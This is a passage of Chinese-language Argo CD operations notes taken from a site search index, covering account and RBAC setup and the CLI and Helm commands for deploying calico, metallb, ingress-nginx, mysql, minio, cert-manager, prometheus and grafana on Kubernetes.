kubectl -n kube-server edit cm argocd-cm\ndata:\n  \u2026\u2026\n  accounts.jesse: login\n  accounts.jesse.enabled: \"true\"\n\n# setting account jesse's pass\n# --current-password is admin's pass required\n~ $ argocd account update-password  --account jesse --current-password xxxx --new-password xxxx --grpc-web\n\nkubectl -n kube-server edit cm argocd-rbac-cm\n# policy\n# p, user, *, *, project/*, allow   ---- p=policy\uff0c\u7528\u6237\u540d\uff0c\u8d44\u6e90\uff0c\u52a8\u4f5c\uff0c\u9879\u76ee\uff0callow\u6216deny\n# policy.default: role:readonly     ---- \u9ed8\u8ba4\u7b56\u7565\n#\n  policy.csv: |\n    p, jesse, applications, *, */*, allow\n    p, jesse, clusters, *, *, allow\n    p, jesse, certificates, get, *, allow\n    p, jesse, repositories, get, *, allow\n    p, jesse, projects, get, *, allow\n    p, jesse, accounts, get, *, allow\n    p, jesse, gpgkeys, get, *, allow\n    p, jesse, logs, get, *, allow\n    p, jesse, exec, create, */*, allow\n\nargocd login argo-cd.8ops.top --grpc-web\nargocd account list --grpc-web\n\n\n# Can I sync any app?\nargocd account can-i sync applications '*'\n\n# Can I update a project?\nargocd account can-i update projects 'default'\n\n# Can I create a cluster?\nargocd account can-i create clusters '*'\n\nActions: [get create update delete sync override]\nResources: [clusters projects applications applicationsets repositories certificates logs exec]\n</code></pre>"},{"location":"kubernetes/04-argocd/#23","title":"2.3 \u5b58\u50a8","text":"<p>\u76f8\u5173\u5143\u4fe1\u606f\u5b58\u50a8\u5728 kubernetes cluster's etcd \u4e2d</p> <pre><code># 1\uff0c\u83b7\u53d6\u8d44\u6e90\u7c7b\u578b\n$ kubectl api-resources | grep argo\napplications      app,apps         argoproj.io/v1alpha1  true  Application\napplicationsets   appset,appsets   argoproj.io/v1alpha1  true  ApplicationSet\nappprojects       appproj,appprojs argoproj.io/v1alpha1  true  AppProject\nargocdextensions                   argoproj.io/v1alpha1  true  ArgoCDExtension\n\n# 2\uff0c\u83b7\u53d6\u8d44\u6e90\u5217\u8868\n$ kubectl -n kube-server get applications\nNAME             SYNC STATUS   HEALTH STATUS\nhelm-guestbook   Synced        Healthy\n\n# 3\uff0c\u5c55\u5f00\u8be6\u60c5\n$ kubectl -n kube-server get applications helm-guestbook -o yaml\napiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  creationTimestamp: \"2022-10-11T05:37:49Z\"\n  generation: 19734\n  name: helm-guestbook\n  namespace: kube-server\n  resourceVersion: \"18247691\"\n  uid: c26e8225-c6cc-4338-a494-525f572cae4a\nspec:\n  destination:\n    namespace: kube-app\n    server: https://kubernetes.default.svc\n  project: argo-example-apps\n  source:\n    helm:\n      parameters:\n      - name: replicaCount\n        value: \"2\"\n    path: helm-guestbook\n    repoURL: https://git.8ops.top/gce/argocd-example-apps.git\n    targetRevision: HEAD\n\u2026\u2026    \n</code></pre>"},{"location":"kubernetes/04-argocd/#24","title":"2.4 \u7efc\u5408","text":"<pre><code>argocd login argo-cd.8ops.top --username=admin --password=xx --grpc-web\nargocd account update-password --account jesse --current-password xx --new-password xx --grpc-web\n\nargocd ctx list\n\nargocd cluster list\nargocd proj    list\nargocd repo    list\nargocd app     list\n\n# backup\nargocd cluster list -o yaml &gt; 01-argocd-cluster-list.yaml\nargocd proj    list -o yaml &gt; 02-argocd-proj-list.yaml\nargocd repo    list -o yaml &gt; 03-argocd-repo-list.yaml\nargocd app     list -o yaml &gt; 04-argocd-app-list.yaml\n\nkubectl run redis-client --restart='Never' \\\n  --image hub.8ops.top/bitnami/redis:7.0.4 \\\n  --namespace kube-app \\\n  --command -- sleep infinity\n</code></pre>"},{"location":"kubernetes/04-argocd/#25-cluster","title":"2.5 cluster","text":"<pre><code>argocd cluster list\nargocd cluster rm 11-dev-ofc\n\n# cluster add\nargocd cluster add 11-dev-ofc-insecure  --name=11-dev-ofc  --grpc-web\nargocd cluster add 12-test-ali-insecure --name=12-test-ali --grpc-web\nargocd cluster add 13-stage-sh-insecure --name=13-stage-sh --grpc-web\nargocd cluster add 14-prod-sh-insecure  --name=14-prod-sh  --grpc-web\n</code></pre>"},{"location":"kubernetes/04-argocd/#26-proj","title":"2.6 proj","text":"<pre><code>argocd proj list\nargocd proj delete argo-example-proj\nargocd proj create argo-example-proj --description \"argo example proj\" \n\n# argocd proj add-source\nargocd proj remove-source argo-example-proj  \\\n    https://git.8ops.top/ops/argocd-example-apps.git\nargocd proj add-source argo-example-proj \\\n    https://git.8ops.top/ops/argocd-example-apps.git\n\n# argocd proj add-destination argo-example-proj in-cluster kube-app --name\nargocd proj remove-destination argo-example-proj \\\n    https://kubernetes.default.svc kube-app\nargocd proj add-destination argo-example-proj \\\n    https://kubernetes.default.svc kube-app \nargocd proj get argo-example-proj\n\n# argocd proj allow-cluster-resource\nargocd proj allow-cluster-resource argo-example-proj '*' '*' -l allow\n\n# argocd proj allow-namespace-resource\nargocd proj allow-namespace-resource argo-example-proj '*' '*' -l allow\n\n# ---\nargocd proj create control-plane-proj --description \"control plane proj\" \nargocd proj add-source control-plane-proj \\\n    https://git.8ops.top/ops/control-plane-ops.git\nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc default \nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc kube-server \nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc kube-system\nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc elastic-system\nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc cert-manager\nargocd proj get control-plane-proj\n</code></pre>"},{"location":"kubernetes/04-argocd/#27-repo","title":"2.7 repo","text":"<pre><code>argocd repo list\nargocd repo rm https://git.8ops.top/ops/argocd-example-apps.git\nargocd repo add https://git.8ops.top/ops/argocd-example-apps.git \\\n    --name argo-example-repo \\\n    --project argo-example-proj \\\n    --username gitlab-read \\\n    --password xx \\\n    --insecure-skip-server-verification\nargocd repo get https://git.8ops.top/ops/argocd-example-apps.git\n\n# ---\n\nargocd repo add https://git.8ops.top/ops/control-plane-ops.git \\\n    --name control-plane-repo \\\n    --project control-plane-proj \\\n    --username gitlab-read \\\n    --password xx \\\n    --insecure-skip-server-verification    \n</code></pre>"},{"location":"kubernetes/04-argocd/#28-app","title":"2.8 app","text":"<pre><code>argocd app list\n\n# Create a directory app\nargocd app delete guestbook\nargocd app create guestbook \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path guestbook \\\n    --project argo-example-proj \\\n    --directory-recurse \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \n\n# Create a Helm app\nargocd app delete helm-guestbook\nargocd app create helm-guestbook \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-guestbook \\\n    --dest-namespace kube-app \\\n    --project argo-example-proj \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \n\nargocd app set helm-guestbook --values values-production.yaml\n\n# Create a Helm app from a Helm repo\nargocd app delete helm-repo-redis\nargocd app create helm-repo-redis \\\n    --repo https://charts.bitnami.com/bitnami \\\n    --helm-chart redis \\\n    --revision 17.3.14 \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --helm-set global.imageRegistry=hub.8ops.top \\\n    --helm-set image.tag=7.0.5 \\\n    --helm-set architecture=standalone \\\n    --helm-set auth.password=xx \\\n    --helm-set master.persistence.enabled=false \\\n    --helm-set metrics.enabled=true \\\n    --helm-set metrics.image.tag=1.37.0 \n\nargocd app set helm-repo-redis --helm-set master.count=1\nargocd app set helm-repo-redis --helm-set replica.persistence.enabled=false\n\n# # Create a Helm app from a Helm repo\n# argocd app delete helm-repo-redis-cluster\n# argocd app create helm-repo-redis-cluster \\\n#     --repo https://charts.bitnami.com/bitnami \\\n#     --helm-chart redis-cluster \\\n#     --revision 7.5.0 \\\n#     --dest-namespace kube-app \\\n#     --dest-server https://kubernetes.default.svc \\\n#     --label author=jesse \\\n#     --label tier=helm \n#     --values-literal-file cluster-values.yaml\n# \n# # TODO persistence \u672a\u6210\u529f\u79fb\u9664\n# argocd app set helm-repo-redis-cluster --helm-set persistence.enabled=false \n# argocd app set helm-repo-redis-cluster --helm-set redis.useAOFPersistence=false \n</code></pre>"},{"location":"kubernetes/04-argocd/#29-app-helm-template","title":"2.9 app Helm Template","text":"<p>Create a Helm app from a Helm Templates</p> <p>sentinel</p> <pre><code>helm search repo redis\n\nhelm pull bitnami/redis --version 17.3.14 -d /tmp\ntar xf /tmp/redis-17.3.14.tgz -C .\nmv redis helm-repo-redis-sentinel-tpl\n\nvim helm-repo-redis-sentinel-tpl/values.yaml\n\nhelm install --generate-name --dry-run --debug \\\n  helm-repo-redis-sentinel-tpl \\\n  -f helm-repo-redis-sentinel-tpl/values.yaml\n\nhelm -n kube-app uninstall helm-repo-redis-sentinel-tpl-standalone\nhelm -n kube-app upgrade --install helm-repo-redis-sentinel-tpl-standalone \\\n    helm-repo-redis-sentinel-tpl \\\n    -f helm-repo-redis-sentinel-tpl/sentinel-standalone-values.yaml\n\nhelm -n kube-app uninstall helm-repo-redis-sentinel-tpl-replication\nhelm -n kube-app upgrade --install helm-repo-redis-sentinel-tpl-replication \\\n    helm-repo-redis-sentinel-tpl \\\n    -f helm-repo-redis-sentinel-tpl/sentinel-replication-values.yaml\n\nkubectl -n kube-app exec -it redis-client bash\nredis-cli -h helm-repo-redis-sentinel-tpl-standalone-headless -a jesse\nconfig get maxmemory\n\nredis-cli -h helm-repo-redis-sentinel-tpl-replication-headless -a jesse info replication\nredis-cli -h helm-repo-redis-sentinel-tpl-replication -a jesse info replication\nredis-cli -h helm-repo-redis-sentinel-tpl-replication-node-0.helm-repo-redis-sentinel-tpl-replication-headless.kube-app.svc.cluster.local -a jesse info replication\n\nargocd app delete helm-repo-redis-sentinel-tpl-standalone\nargocd app create helm-repo-redis-sentinel-tpl-standalone \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-repo-redis-sentinel-tpl \\\n    --project argo-example-proj \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values standalone-values.yaml\n\nargocd app delete helm-repo-redis-sentinel-tpl-replication\nargocd app create helm-repo-redis-sentinel-tpl-replication \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-repo-redis-sentinel-tpl \\\n    --project argo-example-proj \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values replication-values.yaml\n</code></pre> <p>cluster</p> <pre><code>helm pull bitnami/redis-cluster --version 8.3.1 -d /tmp\ntar xf /tmp/redis-cluster-8.3.1.tgz -C .\nmv redis-cluster helm-repo-redis-cluster-tpl\n\nvim helm-repo-redis-cluster-tpl/values.yaml\n\nhelm install --generate-name --dry-run --debug \\\n  helm-repo-redis-cluster-tpl \\\n  -f helm-repo-redis-cluster-tpl/values.yaml\n\nhelm -n kube-app uninstall helm-repo-redis-cluster-tpl\nhelm -n kube-app upgrade --install helm-repo-redis-cluster-tpl \\\n    helm-repo-redis-cluster-tpl \\\n    -f helm-repo-redis-cluster-tpl/cluster-values.yaml\n\nkubectl -n kube-app rollout restart sts helm-repo-redis-cluster-tpl\nkubectl -n kube-app exec -it redis-client bash\nredis-cli -h helm-repo-redis-cluster-tpl-headless -a jesse -c\nconfig get maxmemory\n\nargocd app delete helm-repo-redis-cluster-tpl\nargocd app create helm-repo-redis-cluster-tpl \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-repo-redis-cluster-tpl \\\n    --project argo-example-proj \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values cluster-values.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#210-app-helm-dependency","title":"2.10 app Helm Dependency","text":"<p>Create a Helm app from a Helm Dependency</p> <p>sentinel</p> <pre><code>mkdir -p helm-repo-redis-sentinel-dep\ncd helm-repo-redis-sentinel-dep\n\n# - name: redis \u5fc5\u987b\u662f bitnami \u91cc\u9762\u5b58\u5728\u7684 Charts\ncat &lt;&lt;EOF | tee Chart.yaml\napiVersion: v2\nname: bitnami-redis\nversion: \"17.3.14\"\ndependencies:\n- name: redis\n  version: \"17.3.14\"\n  repository: \"https://charts.bitnami.com/bitnami\"\nEOF\n\nvim sentinel-values.yaml\n\nhelm dep build --skip-refresh\nhelm dep list\n\nhelm install --generate-name --dry-run --debug \\\n  helm-repo-redis-sentinel-dep \\\n  -f helm-repo-redis-sentinel-dep/standalone-values.yaml\n\nhelm install --generate-name --dry-run --debug \\\n  helm-repo-redis-sentinel-dep \\\n  -f helm-repo-redis-sentinel-dep/replication-values.yaml\n\nargocd app delete helm-repo-redis-sentinel-dep-standalone\nargocd app create helm-repo-redis-sentinel-dep-standalone \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-repo-redis-sentinel-dep \\\n    --project argo-example-proj \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --release-name helm-repo-redis-sentinel-dep-standalone \\\n    --values standalone-values.yaml\n\nargocd app delete helm-repo-redis-sentinel-dep-replication\nargocd app create helm-repo-redis-sentinel-dep-replication \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-repo-redis-sentinel-dep \\\n    --project argo-example-proj \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --release-name helm-repo-redis-sentinel-dep-replication \\\n    --values replication-values.yaml\n</code></pre> <p>cluster</p> <pre><code>mkdir -p helm-repo-redis-cluster-dep\ncd helm-repo-redis-cluster-dep\n\n# - name: redis-cluster \u5fc5\u987b\u662f bitnami \u91cc\u9762\u5b58\u5728\u7684 Charts\ncat &lt;&lt;EOF | tee Chart.yaml\napiVersion: v2\nname: bitnami-redis\nversion: \"8.3.1\"\ndependencies:\n- name: redis-cluster\n  version: \"8.3.1\"\n  repository: \"https://charts.bitnami.com/bitnami\"\nEOF\n\nvim cluster-values.yaml\n\nhelm dep build --skip-refresh\nhelm dep list\n\nhelm install --generate-name --dry-run --debug \\\n  helm-repo-redis-cluster-dep \\\n  -f helm-repo-redis-cluster-dep/cluster-values.yaml\n\nargocd app delete helm-repo-redis-cluster-dep\nargocd app create helm-repo-redis-cluster-dep \\\n    --repo https://git.8ops.top/ops/argocd-example-apps.git \\\n    --path helm-repo-redis-cluster-dep \\\n    --project argo-example-proj \\\n    --dest-namespace kube-app \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values cluster-values.yaml\n\n# #\u7ecf\u9a8c\u8bc1\u662f\u975e\u5fc5\u987b\u7684\n#    --release-name helm-repo-redis-cluster-dep \\ \n# argocd app delete argo-cd --cascade=false\n</code></pre>"},{"location":"kubernetes/04-argocd/#argocd_1","title":"\u4e09\u3001ArgoCD \u573a\u666f","text":"<p>\u5c1d\u8bd5\u81ea\u4e3e argocd </p> <pre><code>helm repo add argoproj https://argoproj.github.io/argo-helm\nhelm repo update argoproj\nhelm search repo argo-cd\nhelm pull argoproj/argo-cd --version 5.13.8 -d /tmp\ntar xf /tmp/argo-cd-5.13.8.tgz -C .\n\ncd argo-cd\nvim values-ops.yaml\n\nargocd app create argo-cd \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path devops/argo-cd \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n\n# \u8c8c\u4f3c\u4e0d\u5141\u8bb8\u8fd9\u6837\n# argocd app delete argo-cd\n</code></pre>"},{"location":"kubernetes/04-argocd/#31-calico","title":"3.1 calico","text":"<pre><code>helm repo add projectcalico https://projectcalico.docs.tigera.io/charts\nhelm repo update\nhelm search repo tigera-operator\nhelm pull projectcalico/tigera-operator --version v3.24.1 -d /tmp\ntar xf /tmp/tigera-operator-v3.24.1.tgz -C .\n\ncd tigera-operator\nvim values-ops.yaml\n\nargocd proj allow-cluster-resource control-plane-proj * * \nargocd proj allow-namespace-resource control-plane-proj * * \nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc kube-system\nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc kube-server\nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc default\nargocd proj get control-plane-proj\n\nargocd app create calico \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path tigera-operator \\\n    --project control-plane-proj \\\n    --dest-namespace kube-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml \\\n    --helm-skip-crds\n\n# \u7531\u4e8e\u6b64\u524d\u4f7f\u7528Helm\u5b89\u88c5\u8fc7calico\n</code></pre>"},{"location":"kubernetes/04-argocd/#32-metallb","title":"3.2 metallb","text":"<pre><code>helm repo add metallb https://metallb.github.io/metallb\nhelm repo update metallb\nhelm search repo metallb\nhelm pull metallb/metallb --version 0.13.7 -d /tmp\ntar xf /tmp/metallb-0.13.7.tgz -C .\n\ncd metallb\nvim values-ops.yaml\n\nargocd app create metallb \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path metallb \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml \\\n    --helm-skip-crds\n\n# \u3010\u4e0d\u5efa\u8bae\u8fd9\u6837\u3011\n# argocd app delete metallb\n# \u5176\u4e2d\u8d44\u6e90 bgppeers.metallb.io + addresspools.metallb.io \u4f1a\u4e00\u76f4\u62a5 OutOfSync\n\nargocd app create metallb-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path metallb/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --label author=jesse \\\n    --label tier=helm \nargocd app set metallb-extention --sync-policy automated\n</code></pre>"},{"location":"kubernetes/04-argocd/#33-ingress-nginx","title":"3.3 ingress-nginx","text":"<p>Reference</p> <pre><code>helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx\nhelm repo update ingress-nginx\nhelm search repo ingress-nginx\nhelm pull ingress-nginx/ingress-nginx --version 4.4.0 -d /tmp\ntar xf /tmp/ingress-nginx-4.4.0.tgz -C .\n\ncd ingress-nginx\nvim values-ops.yaml\n\nargocd app create ingress-nginx \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path ingress-nginx \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#34-dashboard","title":"3.4 dashboard","text":"<p>Reference</p> <pre><code>helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/\nhelm repo update kubernetes-dashboard\nhelm search repo kubernetes-dashboard\nhelm pull kubernetes-dashboard/kubernetes-dashboard --version 6.0.0 -d /tmp\ntar xf /tmp/kubernetes-dashboard-6.0.0.tgz -C .\n\ncd kubernetes-dashboard\nvim values-ops.yaml\n\nargocd app create kubernetes-dashboard \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path kubernetes-dashboard \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#35-toolkit","title":"3.5 toolkit","text":"<pre><code># echoserver\nargocd app create toolkit \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path toolkit \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace default \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \n</code></pre>"},{"location":"kubernetes/04-argocd/#36-mysql","title":"3.6 mysql","text":"<pre><code>helm repo add bitnami https://charts.bitnami.com/bitnami\nhelm repo update bitnami\nhelm search repo mysql\nhelm pull bitnami/mysql --version 9.4.5 -d /tmp\ntar xf /tmp/mysql-9.4.5.tgz -C .\n\ncd mysql\nvim values-standalone.yaml\n\nargocd app create mysql-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path mysql/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm     \n\nargocd app create mysql-standalone \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path mysql \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-standalone.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#37-minio","title":"3.7 minio","text":"<pre><code>helm repo add minio https://charts.min.io/\nhelm repo update minio\nhelm search repo minio\nhelm pull minio/minio --version 5.0.4 -d /tmp\ntar xf /tmp/minio-5.0.4.tgz -C .\n\ncd minio\nvim values-ops.yaml\n\nargocd app create minio-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path minio/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm     \n\nargocd app create minio \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path minio \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n\nhelm upgrade --install minio minio/minio \\\n    -f minio.yaml-5.0.4 \\\n    --namespace=kube-server \\\n    --create-namespace \\\n    --version 5.0.4   \n</code></pre>"},{"location":"kubernetes/04-argocd/#38-nfs-provider","title":"3.8 nfs-provider","text":"<p>Reference</p> <p>sample</p> <pre><code>helm repo add nfs-provider https://kubernetes-sigs.github.io/nfs-subdir-external-provisioner\nhelm repo update nfs-provider\nhelm search repo nfs\nhelm pull nfs-provider/nfs-subdir-external-provisioner --version 4.0.17 -d /tmp\ntar xf /tmp/nfs-subdir-external-provisioner-4.0.17.tgz -C .\n\ncd nfs-subdir-external-provisioner\nvim values-ops.yaml\n\n# \u9700\u8981\u5728\u8282\u70b9\u4e0a\u652f\u6301 mount.nfs\uff0c\u5426\u5219 Pod \u4f1a\u62a5\u9519\u8bef\n# Warning  FailedMount  3m51s (x650 over 21h)  kubelet  MountVolume.SetUp failed for volume \"nfs-subdir-external-provisioner-root\" : mount failed: exit status 32\napt install nfs-common\n\nargocd app create nfs-subdir-external-provisioner \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path nfs-subdir-external-provisioner \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n\n# extention\nargocd app create nfs-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path nfs-subdir-external-provisioner/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace default \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \n</code></pre>"},{"location":"kubernetes/04-argocd/#39-cert","title":"3.9 cert","text":"<p>Reference</p>"},{"location":"kubernetes/04-argocd/#391-cert-manager","title":"3.9.1 cert-manager","text":"<pre><code>helm repo add jetstack https://charts.jetstack.io\nhelm repo update jetstack\nhelm search repo cert-manager\nhelm pull jetstack/cert-manager --version v1.11.0 -d /tmp\ntar xf /tmp/cert-manager-v1.11.0.tgz -C .\n\ncd cert-manager\nvim values-ops.yaml\n\nargocd app create cert-manager \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path cert-manager \\\n    --project control-plane-proj \\\n    --dest-namespace cert-manager \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#392-imroc","title":"3.9.2 imroc","text":"<p>webhook-dnspod</p> <pre><code>helm repo add imroc https://charts.imroc.cc\nhelm repo update imroc\nhelm search repo cert-manager-webhook-dnspod\nhelm pull imroc/cert-manager-webhook-dnspod --version 1.2.0 -d /tmp\ntar xf /tmp/cert-manager-webhook-dnspod-1.2.0.tgz -C .\n\ncd cert-manager-webhook-dnspod\nvim values-ops.yaml\n\nargocd app create cert-manager-webhook-dnspod \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path cert-manager-webhook-dnspod \\\n    --project control-plane-proj \\\n    --dest-namespace cert-manager \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#393-extension","title":"3.9.3 extension","text":"<p>cluster-issuer + certificate</p> <pre><code>argocd app create cert-manager-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path cert-manager/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace cert-manager \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \n</code></pre>"},{"location":"kubernetes/04-argocd/#310-prometheus","title":"3.10 prometheus","text":"<p>Reference</p>"},{"location":"kubernetes/04-argocd/#3101-prometheus","title":"3.10.1 prometheus","text":"<pre><code>helm repo add prometheus-community https://prometheus-community.github.io/helm-charts\nhelm repo update prometheus-community\nhelm search repo prometheus\nhelm pull prometheus-community/prometheus --version 15.8.5 -d /tmp\ntar xf /tmp/prometheus-15.8.5.tgz -C .\n\ncd prometheus\nvim values-server.yaml\nvim values-alertmanager.yaml\nvim values-extra.yaml\n\n  # strategy:\n  #   type: Recreate\n\nargocd app create prometheus \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path prometheus \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-server.yaml \\\n    --values values-alertmanager.yaml \\\n    --values values-extra.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#3102-extention","title":"3.10.2 extention","text":"<pre><code>argocd app create prometheus-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path prometheus/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=directory \n</code></pre>"},{"location":"kubernetes/04-argocd/#3103-blackbox","title":"3.10.3 blackbox","text":"<pre><code>helm search repo prometheus-blackbox-exporter\nhelm pull prometheus-community/prometheus-blackbox-exporter --version 7.0.0 -d /tmp\ntar xf /tmp/prometheus-blackbox-exporter-7.0.0.tgz -C .\n\ncd prometheus-blackbox-exporter\nvim values-ops.yaml\n\nargocd app create prometheus-blackbox-exporter \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path prometheus-blackbox-exporter \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#3104-grafana","title":"3.10.4 grafana","text":"<p>mysql</p> <p>auth.gitlab</p> <pre><code>helm repo add grafana https://grafana.github.io/helm-charts\nhelm repo update grafana\nhelm search repo grafana\nhelm pull grafana/grafana --version 6.38.1 -d /tmp\ntar xf /tmp/grafana-6.38.1.tgz -C .\n\ncd grafana\nvim values-ops.yaml\n\nargocd app create grafana \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path grafana \\\n    --project control-plane-proj \\\n    --dest-namespace kube-server \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre> <p>grafana.ini</p> <pre><code>grafana.ini:\n  paths:\n    data: 